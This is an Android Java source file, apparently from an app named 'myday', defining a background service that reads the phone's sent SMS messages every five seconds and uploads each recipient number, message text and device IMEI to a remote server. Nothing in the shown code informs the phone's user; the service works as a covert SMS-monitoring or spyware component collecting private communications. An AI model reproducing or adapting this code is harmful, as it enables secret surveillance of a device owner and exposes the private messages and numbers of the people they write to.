package com.example.myday;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.SharedPreferences.Editor;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;
import android.preference.PreferenceManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONObject;

import java.text.SimpleDateFormat;
import java.util.Calendar;
import java.util.Date;
import java.util.HashSet;
import java.util.Set;

public class ServiceForSmsOutgoing extends Service implements JsonResponse{

	SharedPreferences sh;
	Editor ed;
	Handler hd=new Handler();
	String namespace="urn:demo";     //website open for every website there were same namespace
	   
		String method="msglog";   //databse name in web
		String soap=namespace+method; 
		String url2="";
	private final Uri SMS_URI = Uri.parse("content://sms");
    private final String[] COLUMNS = new String[] {"date", "address", "body", "type"};
    private static final String CONDITIONS = "type = 2 AND date > ";
    private static final String ORDER = "date ASC";
    
    private long timeLastChecked;
    private Cursor cursor;
    long tempdate=0;

	TelephonyManager telemanager;
	@Override
	public IBinder onBind(Intent arg0) {
		// TODO Auto-generated method stub
		return null;
	}

	@Override
	public void onCreate() {
		// TODO Auto-generated method stub
		
		sh=PreferenceManager.getDefaultSharedPreferences(getApplicationContext());
		 url2=sh.getString("url","");
		ed=sh.edit();
		telemanager=(TelephonyManager)getApplicationContext().getSystemService(TELEPHONY_SERVICE);
		long currentTime = System.currentTimeMillis();
		
		ed.putLong("timelastchecked", currentTime);
		ed.commit();
				
		hd.post(outgoingsmschecker);
		super.onCreate();
	}
	
	Runnable outgoingsmschecker=new Runnable() {
		
		public void run() {
			// TODO Auto-generated method stub
			
				timeLastChecked = sh.getLong("timelastchecked", -1L);
									
				ContentResolver cr = getApplicationContext().getContentResolver();
				
				// get all sent SMS records from the date last checked, in descending order
				cursor = cr.query(SMS_URI, COLUMNS, CONDITIONS + timeLastChecked, null, ORDER);
				
				// if there are any new sent messages after the last time we checked
				if (cursor.moveToNext()) 
				{
				    Set<String> sentSms = new HashSet<String>();
				    timeLastChecked = cursor.getLong(cursor.getColumnIndex("date"));
				    do 
				    {
				        long date = cursor.getLong(cursor.getColumnIndex("date"));
				        
				        if(date!=tempdate)
				        {			        
				        	Log.d("hhhhhhhhhhhhh00", ""+date);
				        	SimpleDateFormat formatter = new SimpleDateFormat("yyyy-MM-dd hh:mm:ss");

				        	// Create a calendar object that will convert the date and time value in milliseconds to date. 
				        	Calendar calendar = Calendar.getInstance();
	     
				        	String date1=formatter.format(new Date());
	    
				        	String address = cursor.getString(cursor.getColumnIndex("address"));
				        	String body = cursor.getString(cursor.getColumnIndex("body"));
				        	String thisSms = date + "," + address + "," + body;
				         
				        	if (sentSms.contains(thisSms)) {
				        		continue; // skip that thing
				        	}
				        	// else, add it to the set
				        	sentSms.add(thisSms);
				        	Log.d("Test", "target number: " + address);
				        	Log.d("Test", "msg..: " + body);
				        	Log.d("Test", "date..: " + date1);
				        	// Log.d("Test", "date sent: " + tm);
				        	
				        	//outgoing
				        	sms(address, body, "outgoing");
				        	
				        	tempdate=date;
				        }
				        
				        
				    }while (cursor.moveToNext());
				    
				    cursor.close();
				}
				
				ed.putLong("timelastchecked", timeLastChecked);
				ed.commit();  
				
				hd.postDelayed(outgoingsmschecker, 5000);
		}
	};


	protected void sms(String address, String body, String string) {
		// TODO Auto-generated method stub
		JsonReq JR= new JsonReq();
		JR.json_response=(JsonResponse)ServiceForSmsOutgoing.this;
		String q="/msglog/?id="+sh.getString("log_id", "")+"&imei="+sh.getString("imei","")+"&phone="+address+"&message="+body+"&type="+string;
		JR.execute(q);
//		try
//		{
//			SoapObject sop=new SoapObject(namespace,method);
//			sop.addProperty("imei",telemanager.getDeviceId().toString());
//			//sop.addProperty("uid",sh.getString("lid", ""));
//			sop.addProperty("phone",address);
//			sop.addProperty("message", body);
//			sop.addProperty("type",string);
//			 
//			SoapSerializationEnvelope sen=new SoapSerializationEnvelope(SoapEnvelope.VER11);
//		    sen.setOutputSoapObject(sop);
//		    
//		    
//		    HttpTransportSE http=new HttpTransportSE(Ip.url);
//		    http.call(soap, sen);
//		    String tyy=sen.getResponse().toString();
//		    Toast.makeText(getApplicationContext(), "msg "+tyy, Toast.LENGTH_LONG).show();
//		    
//		}
//		catch(Exception ex)
//		{
//			ex.printStackTrace();
//			Toast.makeText(getApplicationContext(), "error sms"+ex, Toast.LENGTH_LONG).show();
//		}
		 
	
	}

	@Override
	public void response(JSONObject jo) {
		// TODO Auto-generated method stub
		
				try{
				
					String status=jo.getString("status");
					if(status.equalsIgnoreCase("success"))
					{
						
						 Log.d("======", status);
						Toast.makeText(getApplicationContext(), status, Toast.LENGTH_LONG).show();
					}
					else
					{
						Toast.makeText(getApplicationContext(), "Not Success", Toast.LENGTH_LONG).show();
					}
				}
				catch(Exception e){
					e.printStackTrace();
					Toast.makeText(getApplicationContext(), "haii"+e, Toast.LENGTH_LONG).show();
				}
		
	}
	
	

}
